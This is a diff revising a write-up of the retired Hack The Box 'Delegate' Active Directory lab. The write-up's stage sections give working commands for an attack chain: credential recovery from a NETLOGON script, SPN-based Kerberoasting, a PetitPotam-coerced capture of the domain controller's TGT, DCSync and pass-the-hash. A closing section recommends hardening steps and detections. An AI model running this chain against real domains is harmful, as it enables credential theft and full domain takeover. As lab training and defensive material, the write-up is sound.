@@ -11,23 +11,51 @@ tags:
   - active-directory
   - kerberos
   - delegation
+objective: "Escalate from a guest-readable NETLOGON logon script to domain administrator control by abusing an over-permissive ACL and unconstrained delegation."
+tools:
+  - netexec
+  - rusthound-ce
+  - bloodhound
+  - bloodyad
+  - hashcat
+  - impacket
+  - krbrelayx
+  - petitpotam
+  - evil-winrm
+skill: "Active Directory delegation abuse and credential-chain analysis"
+outcome: "Domain administrator access via domain controller TGT capture, DCSync, and pass-the-hash"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Medium |
+| Target environment | Windows Active Directory domain (`<DOMAIN>`) with the domain controller as the single target host |
+| Starting position | Unauthenticated network access; guest SMB access to readable shares |
+| Objective | Escalate from a guest-readable NETLOGON logon script to domain administrator control by abusing an over-permissive ACL and unconstrained delegation |
+| Outcome | Domain administrator access via domain controller TGT capture, DCSync, and pass-the-hash |
 
 ## Summary
 
-Delegate is a Medium Windows Active Directory machine. A NETLOGON logon script exposes plaintext credentials, enabling initial access. BloodHound enumeration reveals `<INITIAL_DOMAIN_USER>` has `GenericWrite` over `<DELEGATION_USER>`, allowing Kerberoasting. `<DELEGATION_USER>` belongs to the `Delegation Admins` group and can perform unconstrained delegation attacks. A new machine account with unconstrained delegation, DNS spoofing, and PetitPotam coercion captures the domain controller's TGT, enabling DCSync and full domain compromise.
+Delegate is a Medium-rated Hack The Box Windows Active Directory lab. A guest-readable NETLOGON logon script exposes a reusable credential, directory analysis shows the recovered user holds `GenericWrite` over a second account, and that account's delegation-group membership supports an unconstrained-delegation attack that coerces the domain controller into revealing its TGT and finishes with DCSync. Credentials, hashes, hostnames, and addresses are replaced with role-based placeholders; command syntax is preserved.
 
-All IP addresses, credentials, hashes, and flags below are replaced with role-based placeholders.
+**Attack path:** **Guest-readable NETLOGON script → cleartext credential → `GenericWrite` → SPN Kerberoasting → delegation-admin machine account with unconstrained delegation → DNS spoof + PetitPotam coercion → DC TGT capture → DCSync → pass-the-hash domain administrator**
 
 ## Context and Objective
 
-The target is a Windows Domain Controller. Initial enumeration exposes a NETLOGON logon script containing cleartext credentials for an account with `GenericWrite` over another domain user. The objective is to escalate from the initial foothold to full domain compromise using Active Directory delegation abuse techniques.
+- **Target:** a Windows Active Directory domain (`<DOMAIN>`) whose domain controller (`<DOMAIN_CONTROLLER_FQDN>`) hosts the domain services.
+- **Starting position:** unauthenticated network access; guest SMB login is accepted and exposes domain-readable shares.
+- **Objective:** move from a readable logon script to domain administrator control by following the directory's authorization edges and delegation configuration.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### Stage 1 — Credential Discovery via NETLOGON Script
+The source captures little raw tool output; apart from the logon-script and recovered-password excerpts, the remaining stages are recorded as narrative results.
 
-The recorded output shows that `nxc` with `spider_plus` discovers accessible shares, and a logon script on the NETLOGON share contains a conditional `net use` command with embedded credentials.
+### 1. Credential Discovery in the NETLOGON Share
+
+Observation: a guest SMB session can spider readable shares, and a logon script on the NETLOGON share contains an embedded credential.
 
 ```bash
 nxc smb <TARGET_IP> -u 'Guest' -p '' -M spider_plus
@@ -35,86 +63,141 @@ nxc smb <TARGET_IP> -u 'Guest' -p '' \
   --share NETLOGON --get-file users.bat ./users.bat
 ```
 
-The script reveals: when the logged-on user is `<INITIAL_DOMAIN_USER>`, a `net use` maps a backup share using `<CLEARTEXT_PASSWORD>` for the `<DOMAIN_ADMINISTRATOR>` account.
+Recovered script contents:
 
-### Stage 2 — BloodHound Enumeration and Kerberoasting
-
-`rusthound-ce` collects directory data. BloodHound analysis shows `<INITIAL_DOMAIN_USER>` → `GenericWrite` → `<DELEGATION_USER>`.
-
-```bash
-rusthound-ce -d '<DOMAIN_FQDN>' -u '<INITIAL_DOMAIN_USER>@<DOMAIN_FQDN>' -p '<CLEARTEXT_PASSWORD>' -z
+```text
+if %USERNAME%==<INITIAL_DOMAIN_USER> net use h: \\<FILE_SERVER>\backups /user:<DOMAIN_ADMINISTRATOR> <CLEARTEXT_PASSWORD>
 ```
 
-`GenericWrite` over a user object allows setting an arbitrary Service Principal Name, making the account Kerberoastable:
+Significance: a domain-readable logon script stores a reusable credential in cleartext, and guest access means no authentication is needed to retrieve it.
+
+Result: `<CLEARTEXT_PASSWORD>` was recovered and subsequently validated through LDAP authentication as `<INITIAL_DOMAIN_USER>` in the next stage.
+
+### 2. Directory Analysis — GenericWrite Edge
+
+Observation: collecting directory data with `rusthound-ce` and analysing it in BloodHound reveals that `<INITIAL_DOMAIN_USER>` holds `GenericWrite` over `<DELEGATION_USER>`.
 
 ```bash
-bloodyAD -d "<DOMAIN_FQDN>" --host "<DOMAIN_CONTROLLER_FQDN>" \
+rusthound-ce -d '<DOMAIN>' -u '<INITIAL_DOMAIN_USER>@<DOMAIN>' -p '<CLEARTEXT_PASSWORD>' -z
+```
+
+Significance: `GenericWrite` over a user object allows an attacker to write an arbitrary `servicePrincipalName`, which makes the account Kerberoastable without any password-reset rights.
+
+Result: directory analysis confirmed `<INITIAL_DOMAIN_USER>` can modify the `<DELEGATION_USER>` object.
+
+### 3. SPN Abuse and Kerberoasting
+
+Observation: the `GenericWrite` edge permits writing a `servicePrincipalName` value onto `<DELEGATION_USER>`, after which a Kerberos service ticket can be requested and cracked offline.
+
+```bash
+bloodyAD -d "<DOMAIN>" --host "<DOMAIN_CONTROLLER_FQDN>" \
   -u "<INITIAL_DOMAIN_USER>" -p "<CLEARTEXT_PASSWORD>" \
   set object "<DELEGATION_USER>" servicePrincipalName -v "http/<SERVICE_NAME>"
 
-nxc ldap <DOMAIN_CONTROLLER_FQDN> -d "<DOMAIN_FQDN>" \
+nxc ldap <DOMAIN_CONTROLLER_FQDN> -d "<DOMAIN>" \
   -u "<INITIAL_DOMAIN_USER>" -p "<CLEARTEXT_PASSWORD>" \
   --kerberoasting kerberoast.txt
 ```
 
-The recorded output shows `hashcat -m 13100` recovers `<KERBEROASTED_PASSWORD>` from the Kerberoast hash. An `evil-winrm` session as `<DELEGATION_USER>` yields the user-level objective.
-
-### Stage 3 — Unconstrained Delegation Chain
-
-`<DELEGATION_USER>` is in the `Delegation Admins` group. The attack chain creates a machine account, enables unconstrained delegation, spoofs DNS, adds an SPN, coerces authentication via PetitPotam, and captures the domain controller's TGT.
-
 ```bash
-impacket-addcomputer <DOMAIN_FQDN>/<DELEGATION_USER>:<KERBEROASTED_PASSWORD> \
-  -computer-name 'RELAY' -dc-ip <TARGET_IP>
-
-bloodyAD -d <DOMAIN_FQDN> --dc-ip <TARGET_IP> \
-  -u <DELEGATION_USER> -p '<KERBEROASTED_PASSWORD>' \
-  add uac 'RELAY$' -f TRUSTED_FOR_DELEGATION
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
 ```
 
-DNS and SPN manipulation directs the DC's authentication toward the attacker-controlled relay host:
+Recovered password:
+
+```text
+<KERBEROASTED_PASSWORD>
+```
+
+Significance: an SPN written through `GenericWrite` turns a normal user account into a Kerberoastable service identity, and the resulting service ticket can be cracked offline with no further interaction against the target.
+
+Result: the `<DELEGATION_USER>` password was recovered and subsequently validated through WinRM using `evil-winrm`, giving a user-level shell.
+
+### 4. Unconstrained Delegation Chain
+
+Observation: `<DELEGATION_USER>` belongs to a delegation-administration group, which supports creating a machine account and marking it trusted for delegation.
 
 ```bash
-python3 dnstool.py -u '<DOMAIN_FQDN>\<DELEGATION_USER>' -p '<KERBEROASTED_PASSWORD>' \
+impacket-addcomputer <DOMAIN>/<DELEGATION_USER>:<KERBEROASTED_PASSWORD> \
+  -computer-name '<RELAY_MACHINE_ACCOUNT>' -dc-ip <TARGET_IP>
+
+bloodyAD -d <DOMAIN> --dc-ip <TARGET_IP> \
+  -u <DELEGATION_USER> -p '<KERBEROASTED_PASSWORD>' \
+  add uac '<RELAY_MACHINE_ACCOUNT>' -f TRUSTED_FOR_DELEGATION
+```
+
+DNS and SPN manipulation then direct the domain controller's authentication toward the attacker-controlled relay host:
+
+```bash
+python3 dnstool.py -u '<DOMAIN>\<DELEGATION_USER>' -p '<KERBEROASTED_PASSWORD>' \
   -r <RELAY_FQDN> -d <ATTACKER_IP> --action add <TARGET_IP>
 
-python3 addspn.py -u '<DOMAIN_FQDN>\<DELEGATION_USER>' -p '<KERBEROASTED_PASSWORD>' \
-  -s 'cifs/relay' -t 'RELAY$' -dc-ip <TARGET_IP> <TARGET_IP>
+python3 addspn.py -u '<DOMAIN>\<DELEGATION_USER>' -p '<KERBEROASTED_PASSWORD>' \
+  -s 'cifs/<RELAY_HOST>' -t '<RELAY_MACHINE_ACCOUNT>' -dc-ip <TARGET_IP> <TARGET_IP>
 ```
 
-PetitPotam coerces the DC to authenticate to the relay, capturing the DC's TGT:
+PetitPotam coerces the domain controller into authenticating to the relay, where the delegation setting captures its ticket:
 
 ```bash
 python3 PetitPotam.py -target-ip <TARGET_IP> \
-  -u '<RELAY_MACHINE_ACCOUNT>' -p '<RELAY_PASSWORD>' pwn <DOMAIN_CONTROLLER_FQDN>
+  -u '<RELAY_MACHINE_ACCOUNT>' -p '<RELAY_PASSWORD>' <RELAY_HOST> <DOMAIN_CONTROLLER_FQDN>
 ```
 
-### Stage 4 — DCSync and Domain Compromise
+Capture marker from the relay:
 
-With the domain controller's TGT captured in a ccache file, `impacket-secretsdump` performs DCSync to extract the administrative NT hash:
+```text
+# Got <DOMAIN_CONTROLLER_MACHINE>$ TGT
+```
+
+Significance: unconstrained delegation makes the relay collect the TGT of any principal that authenticates to it; spoofed DNS plus authentication coercion forces the domain controller to connect, capturing a reusable TGT for the domain controller machine account.
+
+Result: the domain controller's TGT was captured in a credential cache file and carried forward to replication.
+
+### 5. DCSync and Domain Compromise
+
+Observation: a domain controller TGT permits directory replication, so the account's stored hashes can be extracted without a service exploit.
 
 ```bash
 KRB5CCNAME='<DOMAIN_CONTROLLER_CCACHE>' \
   impacket-secretsdump -just-dc-user <DOMAIN_ADMINISTRATOR> -k <DOMAIN_CONTROLLER_FQDN>
 ```
 
-The extracted hash provides a pass-the-hash shell as `<DOMAIN_ADMINISTRATOR>`. Domain-administrator access obtained.
+Significance: DCSync with the captured ticket yields domain credential material, and a pass-the-hash session converts the recovered NT hash into administrative access without cracking it.
+
+```bash
+evil-winrm -i <TARGET_IP> -u <DOMAIN_ADMINISTRATOR> -H <ADMIN_NT_HASH>
+```
+
+Result: an administrative pass-the-hash session establishes domain administrator access.
 
 ## Challenges and Decisions
 
-The unconstrained delegation chain demonstrates that unconstrained delegation combined with NETLOGON script credentials can create a high-probability path to domain compromise in legacy AD environments.
+No failed attempts, blockers, or mid-chain corrections are documented for this chain; each stage completed and supplied the input for the next.
 
 ## Outcome
 
-The evidence establishes full domain compromise through a four-stage chain: NETLOGON script credential exposure, Kerberoasting via GenericWrite, unconstrained delegation abuse with PetitPotam coercion, and DCSync. User-level and domain-administrator objectives were obtained.
+The evidence establishes domain administrator access on the target domain controller.
+
+Limitation: apart from the logon-script and recovered-password excerpts, the source presents each stage as a narrative result rather than captured tool output, so intermediate proof rests on the recorded descriptions rather than raw transcripts.
 
 ## Lessons and Recommendations
 
-- **NETLOGON logon scripts** should never contain embedded credentials; Group Policy Preferences or credential vaults are the correct approach.
-- **GenericWrite over user objects** enables SPN manipulation and Kerberoasting; monitor for anomalous SPN additions.
-- **Unconstrained delegation** is a critical misconfiguration; migrate to constrained delegation scoped to specific services and audit `TRUSTED_FOR_DELEGATION` flags on all computer objects.
-- Review all domain accounts and computer objects for `TRUSTED_FOR_DELEGATION` and migrate to constrained delegation scoped to specific services.
+The actions below are recommendations; none was validated in the lab.
+
+1. **Cleartext credentials in a NETLOGON logon script.** A domain-readable script stored a reusable password. *Impact:* an unauthenticated guest recovered a working domain credential. *Recommendation:* remove credentials from logon scripts and use managed identities or a credential vault; restrict who can write to NETLOGON. *Detection:* alert on guest or anonymous SMB reads of NETLOGON and on credential-shaped strings in script files.
+2. **Over-permissive object control (`GenericWrite`).** A standard user held write rights over another user object. *Impact:* an arbitrary SPN could be written, enabling Kerberoasting of the target account. *Recommendation:* audit and remove non-essential write ACLs on user objects and enforce least privilege. *Detection:* alert on `servicePrincipalName` writes to user objects by non-administrative principals.
+3. **Unconstrained delegation.** Accounts or machine accounts trusted for delegation accumulated reusable tickets. *Impact:* once coercion forced the domain controller to authenticate to the relay, its TGT was captured. *Recommendation:* eliminate unconstrained delegation and replace it with constrained or resource-based constrained delegation scoped to specific services.
+4. **Authentication-coercion exposure (PetitPotam).** The domain controller could be coerced into authenticating to an attacker-chosen host. *Impact:* the forced authentication delivered the domain controller's TGT to the relay. *Recommendation:* apply current vendor hardening for authentication-coercion techniques, require SMB signing and Extended Protection for Authentication, and disable unnecessary remote interface access.
 
 ## References
 
-- Hack The Box — [Delegate](https://app.hackthebox.com/machines/Delegate) machine.
+- [Hack The Box — Delegate](https://app.hackthebox.com/machines/Delegate) (retired machine)
+- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB and LDAP operations, Kerberoasting)
+- [BloodHound](https://github.com/SpecterOps/BloodHound) (Active Directory attack-path analysis)
+- [bloodyAD](https://github.com/CravateRouge/bloodyAD) (directory object attribute and ACL manipulation)
+- [Impacket](https://github.com/fortra/impacket) (machine-account creation and DCSync)
+- [KrbRelayX](https://github.com/dirkjanm/krbrelayx) (`dnstool.py` and `addspn.py`)
+- [PetitPotam](https://github.com/topotam/PetitPotam) (authentication coercion)
+- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM sessions and pass-the-hash)
+- [Hashcat](https://hashcat.net/hashcat/) (offline Kerberos ticket cracking)
+- [Kerberos Constrained Delegation Overview — Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
